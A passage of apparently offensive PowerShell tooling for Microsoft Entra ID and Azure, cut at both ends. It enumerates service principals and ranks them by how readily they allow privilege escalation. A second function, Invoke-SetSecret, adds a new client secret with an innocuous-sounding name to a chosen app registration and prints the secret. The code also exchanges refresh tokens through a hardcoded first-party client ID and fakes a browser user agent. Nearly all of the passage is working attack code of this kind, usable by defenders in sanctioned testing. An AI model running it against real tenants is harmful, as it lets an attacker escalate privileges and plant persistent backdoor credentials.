                scope = $Scope
                grant_type  = "refresh_token"
                refresh_token = $RefreshToken
            }
            $resp = Invoke-SmartRequest -Method POST -Uri "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" -Body $body -Headers @{ "User-Agent" = $UA }
            Write-Host "[+] Token acquired via RefreshToken (scope: $Scope)" -ForegroundColor Green
            return @{ Authorization = "Bearer $($resp.access_token)"; "Content-Type" = "application/json"; "User-Agent" = $UA }
        }

        if ($ClientId -and $ClientSecret) {
            $body = @{
                client_id = $ClientId
                client_secret = $ClientSecret
                scope = $Scope
                grant_type = "client_credentials"
            }
            $resp = Invoke-SmartRequest -Method POST -Uri "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" -Body $body -Headers @{ "User-Agent" = $UA }
            Write-Host "[+] Token acquired via Client Credentials (scope: $Scope)" -ForegroundColor Green
            return @{ Authorization = "Bearer $($resp.access_token)"; "Content-Type" = "application/json"; "User-Agent" = $UA }
        }

        throw "[-] No valid authentication method provided."
    }

    $authCount = 0
    if ($AccessToken) {
		$authCount++ 
	}
    if ($RefreshToken){ 
		$authCount++ 
	}
    if ($ClientId -and $ClientSecret) {
		$authCount++ 
	}

    if ($authCount -eq 0) {
        Write-Host "Invoke-FindServicePrincipal" -ForegroundColor DarkYellow
        Write-Host "  -DomainName <domain> -AccessToken <token>"                          -ForegroundColor DarkCyan
        Write-Host "  -DomainName <domain> -RefreshToken <token> [-IncludeARM]"           -ForegroundColor DarkCyan
        Write-Host "  -DomainName <domain> -ClientId <id> -ClientSecret <s> [-IncludeARM]" -ForegroundColor DarkCyan
        return
    }
    if ($authCount -gt 1) {
		Write-Host "[-] Provide only ONE auth method." -ForegroundColor Red
		return 
	}

    $TenantID = Resolve-TenantId -DomainName $DomainName
    if (-not $TenantID) {
		return 
	}

    $headers = Build-AuthHeaders -RefreshToken $RefreshToken -AccessToken $AccessToken -TenantID $TenantID -ClientId $ClientId -ClientSecret $ClientSecret -Scope "https://graph.microsoft.com/.default"

    $armHeaders = $null
    if ($IncludeARM) {
        if ($ARMAccessToken) {
            $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            $armHeaders = @{ Authorization = "Bearer $ARMAccessToken"; "Content-Type" = "application/json"; "User-Agent" = $UA }
            Write-Host "[+] Using provided ARM Access Token" -ForegroundColor Green
        }
        elseif ($RefreshToken -or ($ClientId -and $ClientSecret)) {
            try {
                $armHeaders = Build-AuthHeaders -RefreshToken $RefreshToken -AccessToken "" -TenantID $TenantID -ClientId $ClientId -ClientSecret $ClientSecret -Scope "https://management.azure.com/.default"
            } catch {
                Write-Host "[!] Failed to acquire ARM token: $_" -ForegroundColor Yellow
                Write-Host "    ARM enumeration will be skipped." -ForegroundColor DarkGray
            }
        }
        else {
            Write-Host "[!] -IncludeARM with -AccessToken requires -ARMAccessToken as well" -ForegroundColor Yellow
            Write-Host "    (Graph token can't authenticate to ARM. Use -RefreshToken instead," -ForegroundColor DarkGray
            Write-Host "     or pass a separate ARM token via -ARMAccessToken)" -ForegroundColor DarkGray
        }
    }


    $resourceCache = @{}

    function Resolve-AppRoleName {
        param([string]$ResourceId, [string]$AppRoleId)

        if (-not $resourceCache.ContainsKey($ResourceId)) {
            $map = @{}
            try {
                $resSp = Invoke-SmartRequest -Method GET `
                    -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$ResourceId`?`$select=appRoles,displayName" `
                    -Headers $headers
                foreach ($ar in $resSp.appRoles) {
                    $map[$ar.id] = $ar.value
                }
                $resourceCache[$ResourceId] = @{ Map = $map; Name = $resSp.displayName }
            } catch {
                $resourceCache[$ResourceId] = @{ Map = @{}; Name = "Unknown Resource ($ResourceId)" }
            }
        }

        $entry = $resourceCache[$ResourceId]
        $permName = if ($entry.Map.ContainsKey($AppRoleId)) {
			$entry.Map[$AppRoleId] 
		} else {
			"Unknown ($AppRoleId)"
		}
        $resName  = $entry.Name
        return @{ Permission = $permName; Resource = $resName }
    }

    $allSPs = @()
    $uri = "https://graph.microsoft.com/v1.0/servicePrincipals?`$select=id,appId,displayName,servicePrincipalType&`$top=999"

    Write-Host "`n[*] Fetching Service Principals..." -ForegroundColor Cyan

    while ($uri) {
        try {
            $resp = Invoke-SmartRequest -Method GET -Uri $uri -Headers $headers
            $allSPs += $resp.value
            $uri = $resp.'@odata.nextLink'
        } catch {
            Write-Host "[-] Failed to fetch Service Principals: $_" -ForegroundColor Red
            break
        }
    }

    Write-Host "[*] Total Service Principals: $($allSPs.Count)" -ForegroundColor Cyan

    $spLookup = @{}
    foreach ($sp in $allSPs) { $spLookup[$sp.id] = $sp }

    $spResults = @()
    $spNoPerms = 0

    $CriticalPerms = @(
        "Application.ReadWrite.All",
        "AppRoleAssignment.ReadWrite.All",
        "Directory.ReadWrite.All",
        "RoleManagement.ReadWrite.Directory",
        "Mail.ReadWrite",
        "Mail.Send",
        "Files.ReadWrite.All",
        "Sites.FullControl.All",
        "Exchange.ManageAsApp",
        "full_access_as_app"
    )
    $HighPerms = @(
        "User.ReadWrite.All",
        "Group.ReadWrite.All",
        "GroupMember.ReadWrite.All",
        "UserAuthenticationMethod.ReadWrite.All",
        "Policy.ReadWrite.ConditionalAccess",
        "Policy.ReadWrite.AuthenticationMethod",
        "Sites.ReadWrite.All",
        "SharePointTenantSettings.ReadWrite.All",
        "MailboxSettings.ReadWrite",
        "Calendars.ReadWrite",
        "Domain.ReadWrite.All",
        "EntitlementManagement.ReadWrite.All",
        "PrivilegedAccess.ReadWrite.AzureAD",
        "Device.ReadWrite.All",
        "ServicePrincipalEndpoint.ReadWrite.All"
    )

    foreach ($sp in $allSPs) {
        $spId = $sp.id
        $spName = $sp.displayName

        Write-Host "[*] Checking: $spName" -ForegroundColor Gray

        try {
            $assignResp = Invoke-SmartRequest -Method GET `
                -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/appRoleAssignments" `
                -Headers $headers

            if (-not $assignResp -or -not $assignResp.value -or $assignResp.value.Count -eq 0) {
                $spNoPerms++
                continue
            }

            $permList = @()
            foreach ($assignment in $assignResp.value) {
                $resolved = Resolve-AppRoleName -ResourceId $assignment.resourceId -AppRoleId $assignment.appRoleId
                $permList += [PSCustomObject]@{
                    Permission = $resolved.Permission
                    Resource = $resolved.Resource
                }
            }

            Write-Host "[+] $spName - $($permList.Count) permission(s)" -ForegroundColor Green

            $spResults += [PSCustomObject]@{
                "DisplayName" = $spName
                "ObjectId" = $spId
                "AppId" = $sp.appId
                "Type" = $sp.servicePrincipalType
                "Permissions"  = $permList
                "ArmRoles" = @() 
            }
        } catch {
            $spNoPerms++
        }
    }

    $spResultIndex = @{}
    for ($i = 0; $i -lt $spResults.Count; $i++) {
        $spResultIndex[$spResults[$i].ObjectId] = $i
    }

    $armOnlySPs = @()
    $CriticalArmRoles = @(
        "Owner",
        "Contributor",
        "User Access Administrator",
        "Key Vault Administrator",
        "Azure Kubernetes Service RBAC Cluster Admin"
    )
    $HighArmRoles = @(
        "Storage Blob Data Owner",
        "Storage Blob Data Contributor",
        "Key Vault Secrets Officer",
        "Key Vault Crypto Officer",
        "Virtual Machine Contributor",
        "Network Contributor",
        "SQL Server Contributor",
        "SQL Security Manager",
        "Managed Identity Operator",
        "Managed Identity Contributor",
        "Automation Contributor",
        "Logic App Contributor",
        "Azure Kubernetes Service Contributor",
        "Web Plan Contributor",
        "Website Contributor",
        "Data Factory Contributor",
        "Monitoring Contributor"
    )

    if ($armHeaders) {

        $subscriptions = @()
        try {
            $subResp = Invoke-SmartRequest -Method GET `
                -Uri "https://management.azure.com/subscriptions?api-version=2022-01-01" `
                -Headers $armHeaders

            if ($subResp -and $subResp.value) {
                $subscriptions = $subResp.value
            }
        } catch {
            Write-Host "[-] Failed to list subscriptions: $_" -ForegroundColor Red
        }

        if ($subscriptions.Count -eq 0) {
            Write-Host "[!] No accessible subscriptions found. ARM enumeration skipped." -ForegroundColor Yellow
        } else {
            Write-Host "[+] Found $($subscriptions.Count) subscription(s)" -ForegroundColor Green
            foreach ($sub in $subscriptions) {
                Write-Host "    -> $($sub.displayName) ($($sub.subscriptionId))" -ForegroundColor DarkGray
            }
        }

        $roleDefCache = @{}

        function Resolve-ArmRoleName {
            param([string]$RoleDefinitionId, [string]$Scope)

            if ($roleDefCache.ContainsKey($RoleDefinitionId)) {
                return $roleDefCache[$RoleDefinitionId]
            }

            try {
                $rdResp = Invoke-SmartRequest -Method GET -Uri "https://management.azure.com${RoleDefinitionId}?api-version=2022-04-01" -Headers $armHeaders

                $roleName = $rdResp.properties.roleName
                $roleDefCache[$RoleDefinitionId] = $roleName
                return $roleName
            } catch {
                $roleDefCache[$RoleDefinitionId] = "Unknown ($RoleDefinitionId)"
                return $roleDefCache[$RoleDefinitionId]
            }
        }

        foreach ($sub in $subscriptions) {
            $subId   = $sub.subscriptionId
            $subName = $sub.displayName

            Write-Host "`n[*] Scanning role assignments in: $subName" -ForegroundColor Cyan

            $allAssignments = @()
            $raUri = "https://management.azure.com/subscriptions/$subId/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"

            while ($raUri) {
                try {
                    $raResp = Invoke-SmartRequest -Method GET -Uri $raUri -Headers $armHeaders

                    if ($raResp -and $raResp.value) {
                        $allAssignments += $raResp.value
                    }
                    $raUri = $raResp.nextLink
                } catch {
                    Write-Host "[-] Failed to fetch role assignments for $subName : $_" -ForegroundColor Yellow
                    $raUri = $null
                }
            }

            $spAssignments = $allAssignments | Where-Object { $spLookup.ContainsKey($_.properties.principalId) }

            Write-Host "    Found $($allAssignments.Count) total role assignment(s), $($spAssignments.Count) belong to Service Principals" -ForegroundColor Gray

            foreach ($ra in $spAssignments) {
                $principalId = $ra.properties.principalId
                $roleDefId = $ra.properties.roleDefinitionId
                $scope = $ra.properties.scope

                $roleName = Resolve-ArmRoleName -RoleDefinitionId $roleDefId -Scope $scope

                $scopeDisplay = $scope
                if ($scope -eq "/subscriptions/$subId") {
                    $scopeDisplay = "Subscription: $subName"
                }
                elseif ($scope -match "^/subscriptions/[^/]+/resourceGroups/([^/]+)$") {
                    $scopeDisplay = "RG: $($Matches[1]) ($subName)"
                }
                elseif ($scope -match "resourceGroups/([^/]+)/providers/(.+)$") {
                    $scopeDisplay = "Resource: $($Matches[2]) in RG $($Matches[1])"
                }
                elseif ($scope -eq "/") {
                    $scopeDisplay = "Root (Tenant)"
                }
                elseif ($scope -match "^/providers/Microsoft.Management/managementGroups/(.+)$") {
                    $scopeDisplay = "MgmtGroup: $($Matches[1])"
                }

                $armEntry = [PSCustomObject]@{
                    Role = $roleName
                    Scope = $scopeDisplay
                    RawScope = $scope
                    Subscription = $subName
                    SubscriptionId = $subId
                }

                if ($spResultIndex.ContainsKey($principalId)) {
                    $idx = $spResultIndex[$principalId]
                    $spResults[$idx].ArmRoles += $armEntry
                }
                else {
                    $existing = $armOnlySPs | Where-Object { $_.ObjectId -eq $principalId }
                    if ($existing) {
                        $existing.ArmRoles += $armEntry
                    }
                    else {
                        # Try to resolve name from our SP list
                        $spInfo = $spLookup[$principalId]
                        $name = if ($spInfo) {
							$spInfo.displayName 
						} else {
							"Unknown SP" 
						}
                        $appId = if ($spInfo) {
							$spInfo.appId 
						}       
						else {
							"N/A" 
						}
                        $type = if ($spInfo) {
							$spInfo.servicePrincipalType 
							} else {
								"N/A" 
							}

                        $newEntry = [PSCustomObject]@{
                            "DisplayName" = $name
                            "ObjectId" = $principalId
                            "AppId" = $appId
                            "Type" = $type
                            "Permissions" = @()
                            ArmRoles    = @($armEntry)
                        }
                        $armOnlySPs += $newEntry
                    }
                }
            }
        }

        $spResults += $armOnlySPs
    }


    Write-Host ""
    Write-Host "-------------------------------------------------"
    Write-Host "  [+] Total SPs Scanned				: $($allSPs.Count)"     -ForegroundColor White
    Write-Host "  [+] SPs WITH Permissions/Roles	: $($spResults.Count)" -ForegroundColor Green
    Write-Host "  [-] SPs WITHOUT Permissions		: $spNoPerms"          -ForegroundColor DarkGray
    if ($armHeaders) {
        $armCount = ($spResults | Where-Object { $_.ArmRoles.Count -gt 0 }).Count
        Write-Host "  [+] SPs WITH ARM Roles		: $armCount"       -ForegroundColor Cyan
    }
    Write-Host ""

    if ($spResults.Count -eq 0) {
        Write-Host "`n  [!] No Service Principals with assigned permissions found." -ForegroundColor DarkGray
        Write-Host ("=" * 110) -ForegroundColor DarkCyan
        return
    }

    $criticalSPs = @(); $highSPs = @(); $standardSPs = @()

    foreach ($s in $spResults) {
        $maxLevel = "Standard"

        # Check Graph API permissions
        foreach ($p in $s.Permissions) {
			
            if ($CriticalPerms -contains $p.Permission) {
				$maxLevel = "Critical"
				break 
			}
			
            if ($HighPerms  -contains $p.Permission) {
				if ($maxLevel -ne "Critical") {
					$maxLevel = "High" 
				} 
			}
        }

        foreach ($ar in $s.ArmRoles) {
            if ($CriticalArmRoles -contains $ar.Role) {
				$maxLevel = "Critical"
				break 
			}
            if ($HighArmRoles -contains $ar.Role) {
				if ($maxLevel -ne "Critical") {
					$maxLevel = "High" 
				} 
			}
        }

        switch ($maxLevel) {
            "Critical" { $criticalSPs += $s }
            "High"     { $highSPs     += $s }
            default    { $standardSPs += $s }
        }
    }


    function Show-SPTier {
        param([string]$Label, [string]$Color, [array]$Items)
        if ($Items.Count -eq 0) { return }

        Write-Host ""
        Write-Host "  [$Label] - $($Items.Count) Service Principal(s)" -ForegroundColor $Color
        Write-Host " = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = "
		Write-Host " = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = "
		Write-Host " "

        foreach ($s in $Items) {
            Write-Host ""
            Write-Host "	[*] Name      : $($s.DisplayName)"   -ForegroundColor White
            Write-Host "	[*] ObjectId  : $($s.ObjectId)"      -ForegroundColor DarkGray
            Write-Host "	[*] AppId     : $($s.AppId)"         -ForegroundColor DarkGray
            Write-Host "	[*] Type      : $($s.Type)"          -ForegroundColor DarkGray

            if ($s.Permissions.Count -gt 0) {
                Write-Host "	[!!] Entra API Permissions :" -ForegroundColor White
                $grouped = $s.Permissions | Group-Object -Property Resource
                foreach ($g in $grouped) {
                    foreach ($p in $g.Group) {
                        $pColor = "Yellow"
                        if ($CriticalPerms -contains $p.Permission) { $pColor = "Red" }
                        elseif ($HighPerms -contains $p.Permission) { $pColor = "DarkYellow" }
                        Write-Host "        -> $($p.Permission)" -ForegroundColor $pColor
                    }
                }
            }

            if ($s.ArmRoles.Count -gt 0) {
                Write-Host "	[!!] ARM Role Permissions :" -ForegroundColor White
                foreach ($ar in $s.ArmRoles) {
                    $rColor = "Yellow"
                    if ($CriticalArmRoles -contains $ar.Role) { $rColor = "Red" }
                    elseif ($HighArmRoles -contains $ar.Role) { $rColor = "DarkYellow" }
                    Write-Host "        -> $($ar.Role)" -ForegroundColor $rColor -NoNewline
                    Write-Host "  @ $($ar.Scope)" -ForegroundColor DarkGray
                }
            }
			Write-Host " - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
			Write-Host " "
        }
    }

    Show-SPTier -Label "CRITICAL - CAN ESCALATE PRIVILEGES" -Color Red        -Items $criticalSPs
    Show-SPTier -Label "HIGH - SENSITIVE ACCESS"             -Color DarkYellow -Items $highSPs
    Show-SPTier -Label "STANDARD PERMISSIONS"                -Color White      -Items $standardSPs

    Write-Host ""
    Write-Host ("=" * 80) -ForegroundColor DarkCyan
}
<###############################################################################################################################################>
<###############################################################################################################################################>


function Invoke-SetSecret {


    param(
        [Parameter(Mandatory)][string]$DomainName,
        [Parameter(Mandatory)][string]$TargetServicePrincipalId,
        [string]$RefreshToken,
        [string]$AccessToken,
        [string]$ClientId,
        [string]$ClientSecret,
        [string]$SecretDisplayName = "Authomation_App_Sync",
        [int]$SecretExpiryDays = 365
    )

		function Invoke-SmartRequest {
			param (
				[string]$Method,
				[string]$Uri,
				[hashtable]$Headers,
				$Body = $null,
				[string]$ContentType = $null,
				[int]$MaxRetries = 15
			)

			$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
			if (-not $Headers.ContainsKey("User-Agent")) { $Headers["User-Agent"] = $UA }

			$RetryCount = 0; $Success = $false; $Response = $null

			while (-not $Success -and $RetryCount -lt $MaxRetries) {
				try {
					$p = @{ Method = $Method; Uri = $Uri; Headers = $Headers }
					if ($null -ne $Body) {
						if ($Body -is [hashtable]) { $p['Body'] = $Body }
						else { $p['Body'] = $Body }
					}
					if ($ContentType) { $p['ContentType'] = $ContentType }

					$Response = Invoke-RestMethod @p
					$Success  = $true
				} catch {
					$err = $_
					$code = if ($err.Exception.Response) {
						[int]$err.Exception.Response.StatusCode 
					} else {
						$null 
					}

					if ($code -eq 429) {
						$RetryCount++
						$ra = $err.Exception.Response.Headers["Retry-After"]
						$wait = if (-not [string]::IsNullOrWhiteSpace($ra)) { [int]($ra -join '') } else { 0 }
						if ($wait -eq 0) { $wait = 10 * $RetryCount }
						Write-Host "`t[!] 429 Rate Limit - waiting $wait sec" -ForegroundColor Gray
						Start-Sleep -Seconds $wait
					}
					elseif ($code -eq 401) {
						Write-Host "`t[!] 401 Unauthorized" -ForegroundColor Yellow
						throw "[-] Access denied (401). Token may be expired or lacks required permissions."
					}
					elseif ($code -eq 403) {
						Write-Host "`t[!] 403 Forbidden - $Uri" -ForegroundColor Red
						throw "[-] Access denied (403). Missing required permissions for this operation."
					}
					elseif ($code -eq 404) {
						return $null
					}
					elseif ($null -eq $code -or $code -ge 500) {
						$RetryCount++
						$wait = 5 * $RetryCount
						Write-Host "`t[!] Error ($code). Retrying in $wait sec ($RetryCount/$MaxRetries)" -ForegroundColor Yellow
						Start-Sleep -Seconds $wait
					}
					else { throw $err }
				}
			}
			if (-not $Success) { throw "[-] Request to $Uri failed after $MaxRetries retries." }
			return $Response
		}

		function Decode-JwtPayload {
			param([string]$Token)
			$parts = $Token.Split('.')
			if ($parts.Count -lt 2) { throw "Invalid JWT" }
			$payload = $parts[1]
			# Fix base64url padding
			switch ($payload.Length % 4) {
				2 { $payload += "==" }
				3 { $payload += "="  }
			}
			$payload = $payload.Replace('-','+').Replace('_','/')
			$json = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
			return ($json | ConvertFrom-Json)
		}

		function Resolve-TenantId {
			param([string]$DomainName)
			try {
				$r = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
				$tid = ($r.issuer -split "/")[3]
				Write-Host "[#] Tenant ID for $DomainName -> $tid" -ForegroundColor DarkYellow
				return $tid
			} catch {
				Write-Error "[-] Failed to resolve Tenant ID for $DomainName"
				return $null
			}
		}

		function Build-AuthHeaders {
			param(
				[string]$RefreshToken,
				[string]$AccessToken,
				[string]$TenantID,
				[string]$ClientId,
				[string]$ClientSecret
			)

			$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

			if ($AccessToken) {
				return @{
					Authorization  = "Bearer $AccessToken"
					"Content-Type" = "application/json"
					"User-Agent"   = $UA
				}
			}


			if ($RefreshToken) {
				$tokenUrl = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
				$body = @{
					"client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
					"scope"         = "https://graph.microsoft.com/.default"
					"grant_type"    = "refresh_token"
					"refresh_token" = $RefreshToken
				}
				$tmpHeaders = @{ "User-Agent" = $UA }
				$resp = Invoke-SmartRequest -Method POST -Uri $tokenUrl -Body $body -Headers $tmpHeaders
				$AccessToken = $resp.access_token
				Write-Host "[+] Token acquired via RefreshToken" -ForegroundColor Green
				return @{
					Authorization  = "Bearer $AccessToken"
					"Content-Type" = "application/json"
					"User-Agent"   = $UA
				}
			}

			# Client Credentials flow (SP context)
			if ($ClientId -and $ClientSecret) {
				$tokenUrl = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
				$body = @{
					"client_id" = $ClientId
					"client_secret" = $ClientSecret
					"scope" = "https://graph.microsoft.com/.default"
					"grant_type" = "client_credentials"
				}
				$tmpHeaders = @{ "User-Agent" = $UA }
				$resp = Invoke-SmartRequest -Method POST -Uri $tokenUrl -Body $body -Headers $tmpHeaders
				$AccessToken = $resp.access_token
				Write-Host "[+] Token acquired via Client Credentials" -ForegroundColor Green
				return @{
					Authorization = "Bearer $AccessToken"
					"Content-Type" = "application/json"
					"User-Agent" = $UA
				}
			}

			throw "[-] No valid authentication method provided."
		}


    $authCount = 0
    if ($AccessToken){
		$authCount++
	}
    if ($RefreshToken){
		$authCount++ 
	}
    if ($ClientId -and $ClientSecret){
		$authCount++ 
	}

    if ($authCount -eq 0) {
        Write-Host "Invoke-SetSecret" -ForegroundColor DarkYellow
        Write-Host "  -DomainName <domain> -TargetServicePrincipalId <objectId> -AccessToken <token>" -ForegroundColor DarkCyan
        Write-Host "  -DomainName <domain> -TargetServicePrincipalId <objectId> -RefreshToken <token>" -ForegroundColor DarkCyan
        Write-Host "  -DomainName <domain> -TargetServicePrincipalId <objectId> -ClientId <id> -ClientSecret <secret>" -ForegroundColor DarkCyan
        return
    }
    if ($authCount -gt 1) {
        Write-Host "[-] Provide only ONE auth method." -ForegroundColor Red; return
    }


    $TenantID = Resolve-TenantId -DomainName $DomainName
    if (-not $TenantID) { return }

    $headers = Build-AuthHeaders -RefreshToken $RefreshToken -AccessToken $AccessToken -TenantID $TenantID -ClientId $ClientId -ClientSecret $ClientSecret


    $tokenStr = $headers["Authorization"] -replace "^Bearer\s+", ""
    Write-Host "`n[*] Validating caller permissions..." -ForegroundColor Cyan

    $hasPermission = $false
    try {
        $jwt = Decode-JwtPayload -Token $tokenStr

        if ($jwt.roles) {
            $requiredRoles = @("Application.ReadWrite.All", "Application.ReadWrite.OwnedBy", "Directory.ReadWrite.All")
            foreach ($r in $jwt.roles) {
                if ($requiredRoles -contains $r) {
                    Write-Host "[+] Found application permission: $r" -ForegroundColor Green
                    $hasPermission = $true
                    break
                }
            }
        }

  
        if (-not $hasPermission -and $jwt.wids) {
            $adminRoleTemplates = @(
                "62e90394-69f5-4237-9190-012177145e10",   # Global Administrator
                "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3",   # Application Administrator
                "158c047a-c907-4556-b7ef-446551a6b5f7"     # Cloud Application Administrator
            )
            foreach ($w in $jwt.wids) {
                if ($adminRoleTemplates -contains $w) {
                    $roleName = switch ($w) {
                        "62e90394-69f5-4237-9190-012177145e10" { "Global Administrator" }
                        "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3" { "Application Administrator" }
                        "158c047a-c907-4556-b7ef-446551a6b5f7" { "Cloud Application Administrator" }
                    }
                    Write-Host "[+] Found directory role: $roleName" -ForegroundColor Green
                    $hasPermission = $true
                    break
                }
            }
        }

      
        if (-not $hasPermission -and $jwt.scp) {
            $scopes = $jwt.scp -split " "
            if ($scopes -contains "Application.ReadWrite.All" -or $scopes -contains "Directory.ReadWrite.All") {
                Write-Host "[+] Found delegated scope: Application.ReadWrite.All" -ForegroundColor Green
                $hasPermission = $true
            }
        }

    } catch {
        Write-Host "[!] Could not decode token. Proceeding anyway (API will reject if unauthorized)." -ForegroundColor Yellow
        $hasPermission = $true   # Let the API decide
    }

    if (-not $hasPermission) {
        Write-Host ""
        Write-Host "[-] PERMISSION CHECK FAILED" -ForegroundColor Red
        Write-Host "    Your token does not contain any of the required permissions:" -ForegroundColor Red
        Write-Host "    - Application permission: Application.ReadWrite.All" -ForegroundColor DarkGray
        Write-Host "    - Application permission: Application.ReadWrite.OwnedBy" -ForegroundColor DarkGray
        Write-Host "    - Directory role: Global Administrator" -ForegroundColor DarkGray
        Write-Host "    - Directory role: Application Administrator" -ForegroundColor DarkGray
        Write-Host "    - Directory role: Cloud Application Administrator" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "    Cannot add a secret without one of these." -ForegroundColor Red
        return
    }


    Write-Host "`n[*] Resolving Service Principal -> Application..." -ForegroundColor Cyan

    try {
        $spInfo = Invoke-SmartRequest -Method GET `
            -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$TargetServicePrincipalId`?`$select=appId,displayName" `
            -Headers $headers
    } catch {
        Write-Host "[-] Could not fetch Service Principal $TargetServicePrincipalId : $_" -ForegroundColor Red
        return
    }

    if (-not $spInfo) {
        Write-Host "[-] Service Principal not found: $TargetServicePrincipalId" -ForegroundColor Red
        return
    }

    $targetAppId   = $spInfo.appId
    $targetSpName  = $spInfo.displayName
    Write-Host "[+] Service Principal: $targetSpName  (appId: $targetAppId)" -ForegroundColor Green

 
    try {
        $appResp = Invoke-SmartRequest -Method GET `
            -Uri "https://graph.microsoft.com/v1.0/applications?`$filter=appId eq '$targetAppId'&`$select=id,displayName,appId" `
            -Headers $headers
    } catch {
        Write-Host "[-] Could not search for Application object: $_" -ForegroundColor Red
        return
    }

    if (-not $appResp.value -or $appResp.value.Count -eq 0) {
        Write-Host "[-] No Application object found for appId $targetAppId" -ForegroundColor Red
        Write-Host "    This might be a Microsoft first-party or managed SP (no editable App Registration)." -ForegroundColor DarkGray
        return
    }

    $appObjectId  = $appResp.value[0].id
    $appName      = $appResp.value[0].displayName
    Write-Host "[+] Application Object: $appName  (objectId: $appObjectId)" -ForegroundColor Green


    Write-Host "`n[*] Adding new client secret..." -ForegroundColor Cyan

    $endDate = (Get-Date).AddDays($SecretExpiryDays).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")

    $secretBody = @{
        passwordCredential = @{
            displayName = $SecretDisplayName
            endDateTime = $endDate
        }
    } | ConvertTo-Json -Depth 5

    try {
        $secretResp = Invoke-SmartRequest -Method POST `
            -Uri "https://graph.microsoft.com/v1.0/applications/$appObjectId/addPassword" `
            -Headers $headers `
            -Body $secretBody `
            -ContentType "application/json"
    } catch {
        Write-Host "[-] Failed to add secret: $_" -ForegroundColor Red
        return
    }


    Write-Host ""
    Write-Host "  Target App        : $targetSpName" -ForegroundColor White
    Write-Host "  App Object ID     : $appObjectId" -ForegroundColor White
    Write-Host "  App (Client) ID   : $targetAppId" -ForegroundColor White
    Write-Host "  Tenant ID         : $TenantID" -ForegroundColor White
    Write-Host ""
    Write-Host "  Secret Value      : $($secretResp.secretText)" -ForegroundColor Red
    Write-Host "  Expiry Date       : $($secretResp.endDateTime)" -ForegroundColor DarkYellow
    Write-Host ""
    Write-Host ""
}


<###############################################################################################################################################>
<###############################################################################################################################################>





function Invoke-FindUserRole {


    param(
        [string]$RefreshToken,
        [string]$DomainName,
        [string]$AccessToken
    )

    $RoleTemplateMap = @{
        "62e90394-69f5-4237-9190-012177145e10" = @{ Name = "Global Administrator";                    Desc = "Can manage all aspects of Azure AD and Microsoft services that use Azure AD identities." }
        "e8611ab8-c189-46e8-94e1-60213ab1f814" = @{ Name = "Privileged Role Administrator";           Desc = "Can manage role assignments in Azure AD, and all aspects of Privileged Identity Management." }
        "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" = @{ Name = "Privileged Authentication Administrator"; Desc = "Can access to view, set and reset authentication method information for any user (admin or non-admin)." }
        "fe930be7-5e62-47db-91af-98c3a49a38b1" = @{ Name = "User Administrator";                     Desc = "Can manage all aspects of users and groups, including resetting passwords for limited admins." }
        "29232cdf-9323-42fd-ade2-1d097af3e4de" = @{ Name = "Exchange Administrator";                 Desc = "Can manage all aspects of the Exchange product." }
        "f28a1f50-f6e7-4571-818b-6a12f2af6b6c" = @{ Name = "SharePoint Administrator";              Desc = "Can manage all aspects of the SharePoint service." }
        "3a2c62db-5318-420d-8d74-23affee5d9d5" = @{ Name = "Intune Administrator";                  Desc = "Can manage all aspects of the Intune product." }
        "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3" = @{ Name = "Application Administrator";             Desc = "Can create and manage all aspects of app registrations and enterprise apps." }
        "158c047a-c907-4556-b7ef-446551a6b5f7" = @{ Name = "Cloud Application Administrator";       Desc = "Can create and manage all aspects of app registrations and enterprise apps except App Proxy." }
        "c4e39bd9-1100-46d3-8c65-fb160da0071f" = @{ Name = "Authentication Administrator";          Desc = "Can access to view, set and reset authentication method information for any non-admin user." }
        "b1be1c3e-b65d-4f19-8427-f6fa0d97feb9" = @{ Name = "Conditional Access Administrator";      Desc = "Can manage Conditional Access capabilities." }
        "194ae4cb-b126-40b2-bd5b-6091b380977d" = @{ Name = "Security Administrator";                Desc = "Can read security information and reports, and manage configuration in Azure AD and Office 365." }
        "729827e3-9c14-49f7-bb1b-9608f156bbb8" = @{ Name = "Helpdesk Administrator";                Desc = "Can reset passwords for non-administrators and Helpdesk Administrators." }
        "fdd7a751-b60b-444a-984c-02652fe8fa1c" = @{ Name = "Groups Administrator";                  Desc = "Can manage all aspects of groups and group settings like naming and expiration policies." }
        "966707d0-3269-4727-9be2-8c3a10f19b9d" = @{ Name = "Password Administrator";                Desc = "Can reset passwords for non-administrators and Password Administrators." }
        "b0f54661-2d74-4c50-afa3-1ec803f12efe" = @{ Name = "Billing Administrator";                 Desc = "Can perform common billing related tasks like updating payment information." }
        "4d6ac14f-3453-41d0-bef9-a3e0c569773a" = @{ Name = "License Administrator";                 Desc = "Can manage product licenses on users and groups." }
        "69091246-20e8-4a56-aa4d-066075b2a7a8" = @{ Name = "Teams Administrator";                   Desc = "Can manage the Microsoft Teams service." }
        "5d6b6bb7-de71-4623-b4af-96380a352509" = @{ Name = "Security Reader";                       Desc = "Can read security information and reports in Azure AD and Office 365." }
        "f2ef992c-3afb-46b9-b7cf-a126ee74c451" = @{ Name = "Global Reader";                         Desc = "Can read everything that a Global Administrator can, but not update anything." }
